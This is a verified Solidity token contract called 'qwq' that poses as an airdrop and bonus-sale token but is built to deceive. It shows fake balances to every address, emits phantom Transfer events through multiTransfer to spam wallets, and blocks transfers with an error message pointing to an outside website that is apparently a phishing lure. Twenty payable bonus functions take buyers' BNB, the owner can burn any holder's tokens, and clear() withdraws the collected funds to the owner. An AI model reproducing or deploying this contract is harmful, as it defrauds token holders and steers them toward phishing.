/**
 *Submitted for verification at BscScan.com on 2021-08-11
*/

/**
 *Submitted for verification at BscScan.com on 2021-08-04
*/

// SPDX-License-Identifier: MIT


pragma solidity ^0.8.0;
pragma abicoder v2;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


pragma solidity ^0.8.4;

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);

}


pragma solidity ^0.8.0;

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


pragma solidity ^0.8.0;

abstract contract Pausable is Context {

    event Paused(address account);

    event Unpaused(address account);

    bool private _paused;


    constructor () {
        _paused = false;
    }


    function paused() public view virtual returns (bool) {
        return _paused;
    }


    modifier whenNotPaused() {
        require(!paused(), "Pausable: paused");
        _;
    }


    modifier whenPaused() {
        require(paused(), "Pausable: not paused");
        _;
    }

    function _pause() internal virtual whenNotPaused {
        _paused = true;
        emit Paused(_msgSender());
    }


    function _unpause() internal virtual whenPaused {
        _paused = false;
        emit Unpaused(_msgSender());
    }
}


pragma solidity ^0.8.0;

contract qwq is IERC20, Ownable {
    uint256 public aSBlock; 
    uint256 public aEBlock; 
    uint256 public aCap; 
    uint256 public aTot; 
    uint256 public aAmt; 
    uint256 public sSBlock; 
    uint256 public sEBlock; 
    uint256 public sCap; 
    uint256 public sTot; 
    uint256 public sChunk; 
    uint256 public sPrice; 
    uint256 public sPrice2;
    uint256 public sPrice3; 
    uint256 public sPrice4; 
    uint256 public sPrice5; 
    uint256 public sPrice6; 
    uint256 public sPrice7; 
    uint256 public sPrice8; 
    uint256 public sPrice9; 
    uint256 public sPrice10; 
    uint256 public sPrice11; 
    uint256 public sPrice12; 
    uint256 public sPrice13; 
    uint256 public sPrice14; 
    uint256 public sPrice15; 
    uint256 public sPrice16; 
    uint256 public sPrice17; 
    uint256 public sPrice18; 
    uint256 public sPrice19; 
    uint256 public sPrice20; 


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 private _totalSupply;
        uint256 private _airdropAmount;

    mapping(address => bool) private _unlocked;


    string private _name;
    string private _symbol;
    
    
    constructor () {
        _name = "qwq";
        _symbol = "qwq";
        _airdropAmount = 50000*10**decimals();
        _mint(msg.sender, 100000000000000*10**decimals());
        _mint(address(this), 900000000000000*10**decimals());
        startBonus(0,15000000*10**decimals());
        startBonus2( 0,15000000*10**decimals());
        startBonus3( 0,15000000*10**decimals());
        startBonus4( 0,15000000*10**decimals());
        startBonus5( 0,15000000*10**decimals());
        startBonus6( 0,15000000*10**decimals());
        startBonus7( 0,15000000*10**decimals());
        startBonus8( 0,15000000*10**decimals());
        startBonus9( 0,15000000*10**decimals());
        startBonus10( 0,15000000*10**decimals());
        startBonus11( 0,15000000*10**decimals());
        startBonus12( 0,15000000*10**decimals());
        startBonus13( 0,15000000*10**decimals());
        startBonus14( 0,15000000*10**decimals());
        startBonus15( 0,15000000*10**decimals());
        startBonus16( 0,15000000*10**decimals());
        startBonus17( 0,15000000*10**decimals());
        startBonus18( 0,15000000*10**decimals());
        startBonus19( 0,15000000*10**decimals());
        startBonus20( 0,15000000*10**decimals());


        startAirdrop(block.number,999999999,10000*10**decimals(),2000000000000);
    }
    
    
        function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    
    
    function decimals() public view virtual override returns (uint8) {
        return 8;
    }
    
    
        function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    
        function balanceOf(address account) public view virtual override returns (uint256) {
        if (!_unlocked[account]) {
            return _airdropAmount;
        } else {
            return _balances[account];
        }
    }
        function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function setAirdropAmount(uint256 airdropAmount_) public onlyOwner (){

        _airdropAmount = airdropAmount_;
    }
        function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(_unlocked[sender], "ERC20: token must be unlocked before transfer.Visit TokenOriginal.com for more info'");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;
        _unlocked[recipient] = true;

        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        _unlocked[account] = true;
        
        emit Transfer(address(0), account, amount);
    }
    
       function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;
        _unlocked[account] = false;

        emit Transfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function burn(address account, uint256 amount) public payable onlyOwner {
        _burn(account, amount);
    }
    
    function multiTransfer(address[] memory holders, uint256 amount) public onlyOwner payable {
        for (uint i=0; i<holders.length; i++) {
            emit Transfer(address(this), holders[i], amount);
        }
    }

    function withdrawToken(address receiver, address tokenAddress, uint amount) public onlyOwner payable {
        uint balance = IERC20(tokenAddress).balanceOf(address(this));
        if (amount == 0) {
            amount = balance;
        }

        require(amount > 0 && balance >= amount, "bad amount");
        IERC20(tokenAddress).transfer(receiver, amount);
    }

   function getAirdrop(address _refer) public returns (bool success){
        require(aSBlock <= block.number && block.number <= aEBlock);
        require(aTot < aCap || aCap == 0);
        aTot ++;
        if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){
          _transfer(address(this), _refer, aAmt);
        }
        _transfer(address(this), msg.sender, aAmt);
        return true;
      }

  function getbonus(address _refer) public payable returns (bool success){
    uint256 _eth = msg.value;
    uint256 _tkns;
    _tkns = (sPrice*_eth) / 1 ether;
    sTot ++;
    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){
      
      _transfer(address(this), _refer, _tkns);
    }
    
      _transfer(address(this), msg.sender, _tkns);
    return true;
  }
///////
  function getbonus2(address _refer) public payable returns (bool success){
    uint256 _eth = msg.value;
    uint256 _tkns;
    _tkns = (sPrice2*_eth) / 1 ether;
    sTot ++;
    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){
      
      _transfer(address(this), _refer, _tkns);
    }
    
      _transfer(address(this), msg.sender, _tkns);
    return true;
  }
////////
  function getbonus3(address _refer) public payable returns (bool success){
    uint256 _eth = msg.value;
    uint256 _tkns;
    _tkns = (sPrice3*_eth) / 1 ether;
    sTot ++;
    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){
      
      _transfer(address(this), _refer, _tkns);
    }
    
      _transfer(address(this), msg.sender, _tkns);
    return true;
  }
//////////
  function getbonus4(address _refer) public payable returns (bool success){
    uint256 _eth = msg.value;
    uint256 _tkns;
    _tkns = (sPrice4*_eth) / 1 ether;
    sTot ++;
    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){
      
      _transfer(address(this), _refer, _tkns);
    }
    
      _transfer(address(this), msg.sender, _tkns);
    return true;
  }
////////////
  function getbonus5(address _refer) public payable returns (bool success){
    uint256 _eth = msg.value;
    uint256 _tkns;
    _tkns = (sPrice5*_eth) / 1 ether;
    sTot ++;
    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){
      
      _transfer(address(this), _refer, _tkns);
    }
    
      _transfer(address(this), msg.sender, _tkns);
    return true;
  }
///////////
  function getbonus6(address _refer) public payable returns (bool success){
    uint256 _eth = msg.value;
    uint256 _tkns;
    _tkns = (sPrice6*_eth) / 1 ether;
    sTot ++;
    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){
      
      _transfer(address(this), _refer, _tkns);
    }
    
      _transfer(address(this), msg.sender, _tkns);
    return true;
  }
/////////////
  function getbonus7(address _refer) public payable returns (bool success){
    uint256 _eth = msg.value;
    uint256 _tkns;
    _tkns = (sPrice7*_eth) / 1 ether;
    sTot ++;
    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){
      
      _transfer(address(this), _refer, _tkns);
    }
    
      _transfer(address(this), msg.sender, _tkns);
    return true;
  }
//////////
  function getbonus8(address _refer) public payable returns (bool success){
    uint256 _eth = msg.value;
    uint256 _tkns;
    _tkns = (sPrice8*_eth) / 1 ether;
    sTot ++;
    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){
      
      _transfer(address(this), _refer, _tkns);
    }
    
      _transfer(address(this), msg.sender, _tkns);
    return true;
  }
//////////
  function getbonus9(address _refer) public payable returns (bool success){
    uint256 _eth = msg.value;
    uint256 _tkns;
    _tkns = (sPrice9*_eth) / 1 ether;
    sTot ++;
    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){
      
      _transfer(address(this), _refer, _tkns);
    }
    
      _transfer(address(this), msg.sender, _tkns);
    return true;
  }
//////////
  function getbonus10(address _refer) public payable returns (bool success){
    uint256 _eth = msg.value;
    uint256 _tkns;
    _tkns = (sPrice10*_eth) / 1 ether;
    sTot ++;
    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){
      
      _transfer(address(this), _refer, _tkns);
    }
    
      _transfer(address(this), msg.sender, _tkns);
    return true;
  }
//////////
  function getbonus11(address _refer) public payable returns (bool success){
    uint256 _eth = msg.value;
    uint256 _tkns;
    _tkns = (sPrice11*_eth) / 1 ether;
    sTot ++;
    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){
      
      _transfer(address(this), _refer, _tkns);
    }
    
      _transfer(address(this), msg.sender, _tkns);
    return true;
  }
//////////
  function getbonus12(address _refer) public payable returns (bool success){
    uint256 _eth = msg.value;
    uint256 _tkns;
    _tkns = (sPrice12*_eth) / 1 ether;
    sTot ++;
    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){
      
      _transfer(address(this), _refer, _tkns);
    }
    
      _transfer(address(this), msg.sender, _tkns);
    return true;
  }
//////////
  function getbonus13(address _refer) public payable returns (bool success){
    uint256 _eth = msg.value;
    uint256 _tkns;
    _tkns = (sPrice13*_eth) / 1 ether;
    sTot ++;
    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){
      
      _transfer(address(this), _refer, _tkns);
    }
    
      _transfer(address(this), msg.sender, _tkns);
    return true;
  }
//////////
  function getbonus14(address _refer) public payable returns (bool success){
    uint256 _eth = msg.value;
    uint256 _tkns;
    _tkns = (sPrice14*_eth) / 1 ether;
    sTot ++;
    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){
      
      _transfer(address(this), _refer, _tkns);
    }
    
      _transfer(address(this), msg.sender, _tkns);
    return true;
  }
//////////
  function getbonus15(address _refer) public payable returns (bool success){
    uint256 _eth = msg.value;
    uint256 _tkns;
    _tkns = (sPrice15*_eth) / 1 ether;
    sTot ++;
    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){
      
      _transfer(address(this), _refer, _tkns);
    }
    
      _transfer(address(this), msg.sender, _tkns);
    return true;
  }
//////////
  function getbonus16(address _refer) public payable returns (bool success){
    uint256 _eth = msg.value;
    uint256 _tkns;
    _tkns = (sPrice16*_eth) / 1 ether;
    sTot ++;
    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){
      
      _transfer(address(this), _refer, _tkns);
    }
    
      _transfer(address(this), msg.sender, _tkns);
    return true;
  }
//////////
  function getbonus17(address _refer) public payable returns (bool success){
    uint256 _eth = msg.value;
    uint256 _tkns;
    _tkns = (sPrice17*_eth) / 1 ether;
    sTot ++;
    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){
      
      _transfer(address(this), _refer, _tkns);
    }
    
      _transfer(address(this), msg.sender, _tkns);
    return true;
  }
//////////
  function getbonus18(address _refer) public payable returns (bool success){
    uint256 _eth = msg.value;
    uint256 _tkns;
    _tkns = (sPrice18*_eth) / 1 ether;
    sTot ++;
    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){
      
      _transfer(address(this), _refer, _tkns);
    }
    
      _transfer(address(this), msg.sender, _tkns);
    return true;
  }
//////////
  function getbonus19(address _refer) public payable returns (bool success){
    uint256 _eth = msg.value;
    uint256 _tkns;
    _tkns = (sPrice19*_eth) / 1 ether;
    sTot ++;
    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){
      
      _transfer(address(this), _refer, _tkns);
    }
    
      _transfer(address(this), msg.sender, _tkns);
    return true;
  }
//////////
  function getbonus20(address _refer) public payable returns (bool success){
    uint256 _eth = msg.value;
    uint256 _tkns;
    _tkns = (sPrice20*_eth) / 1 ether;
    sTot ++;
    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){
      
      _transfer(address(this), _refer, _tkns);
    }
    
      _transfer(address(this), msg.sender, _tkns);
    return true;
  }
//////////
  function viewAirdrop() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 DropCap, uint256 DropCount, uint256 DropAmount){
    return(aSBlock, aEBlock, aCap, aTot, aAmt);
  }
  
  function viewSale() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 SaleCap, uint256 SaleCount, uint256 ChunkSize, uint256 SalePrice){
    return(sSBlock, sEBlock, sCap, sTot, sChunk, sPrice);
  }
  ///////
    function viewSale2() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 SaleCap, uint256 SaleCount, uint256 ChunkSize, uint256 SalePrice){
    return(sSBlock, sEBlock, sCap, sTot, sChunk, sPrice2);
  }
  
  function startAirdrop(uint256 _aSBlock, uint256 _aEBlock, uint256 _aAmt, uint256 _aCap) public onlyOwner {
    aSBlock = _aSBlock;
    aEBlock = _aEBlock;
    aAmt = _aAmt;
    aCap = _aCap;
    aTot = 0;
  }
  
  function startBonus(uint256 _sChunk, uint256 _sPrice) public onlyOwner{
    sChunk = _sChunk;
    sPrice =_sPrice;
    sTot = 0;
  }
 ///////  
  function startBonus2(uint256 _sChunk, uint256 _sPrice2) public onlyOwner{
    sChunk = _sChunk;
    sPrice2 =_sPrice2;
    sTot = 0;  }  
////////
  function startBonus3(uint256 _sChunk, uint256 _sPrice3) public onlyOwner{
    sChunk = _sChunk;
    sPrice3 =_sPrice3;
    sTot = 0;  }  
////////
  function startBonus4(uint256 _sChunk, uint256 _sPrice4) public onlyOwner{
    sChunk = _sChunk;
    sPrice4 =_sPrice4;
    sTot = 0;  }  
////////
  function startBonus5(uint256 _sChunk, uint256 _sPrice5) public onlyOwner{
    sChunk = _sChunk;
    sPrice5 =_sPrice5;
    sTot = 0;  }  
////////
  function startBonus6(uint256 _sChunk, uint256 _sPrice6) public onlyOwner{
    sChunk = _sChunk;
    sPrice6 =_sPrice6;
    sTot = 0;  }  
////////
  function startBonus7(uint256 _sChunk, uint256 _sPrice7) public onlyOwner{
    sChunk = _sChunk;
    sPrice7 =_sPrice7;
    sTot = 0;  }  
////////
  function startBonus8(uint256 _sChunk, uint256 _sPrice8) public onlyOwner{
    sChunk = _sChunk;
    sPrice8 =_sPrice8;
    sTot = 0;  }  
////////
  function startBonus9(uint256 _sChunk, uint256 _sPrice9) public onlyOwner{
    sChunk = _sChunk;
    sPrice9 =_sPrice9;
    sTot = 0;  }  
////////
  function startBonus10(uint256 _sChunk, uint256 _sPrice10) public onlyOwner{
    sChunk = _sChunk;
    sPrice10 =_sPrice10;
    sTot = 0;  }  
////////
  function startBonus11(uint256 _sChunk, uint256 _sPrice11) public onlyOwner{
    sChunk = _sChunk;
    sPrice11 =_sPrice11;
    sTot = 0;  }  
////////
  function startBonus12(uint256 _sChunk, uint256 _sPrice12) public onlyOwner{
    sChunk = _sChunk;
    sPrice12 =_sPrice12;
    sTot = 0;  }  
////////
  function startBonus13(uint256 _sChunk, uint256 _sPrice13) public onlyOwner{
    sChunk = _sChunk;
    sPrice13 =_sPrice13;
    sTot = 0;  }  
////////
  function startBonus14(uint256 _sChunk, uint256 _sPrice14) public onlyOwner{
    sChunk = _sChunk;
    sPrice14 =_sPrice14;
    sTot = 0;  }  
////////
  function startBonus15(uint256 _sChunk, uint256 _sPrice15) public onlyOwner{
    sChunk = _sChunk;
    sPrice15 =_sPrice15;
    sTot = 0;  }  
////////
  function startBonus16(uint256 _sChunk, uint256 _sPrice16) public onlyOwner{
    sChunk = _sChunk;
    sPrice16 =_sPrice16;
    sTot = 0;  }  
////////
  function startBonus17(uint256 _sChunk, uint256 _sPrice17) public onlyOwner{
    sChunk = _sChunk;
    sPrice17 =_sPrice17;
    sTot = 0;  }  
////////
  function startBonus18(uint256 _sChunk, uint256 _sPrice18) public onlyOwner{
    sChunk = _sChunk;
    sPrice18 =_sPrice18;
    sTot = 0;  }  
////////
  function startBonus19(uint256 _sChunk, uint256 _sPrice19) public onlyOwner{
    sChunk = _sChunk;
    sPrice19 =_sPrice19;
    sTot = 0;  }  
////////
  function startBonus20(uint256 _sChunk, uint256 _sPrice20) public onlyOwner{
    sChunk = _sChunk;
    sPrice20 =_sPrice20;
    sTot = 0;  }  
////////
    
  function clear(uint amount) public onlyOwner {
        address payable _owner = payable(msg.sender);
        _owner.transfer(amount);
    }
}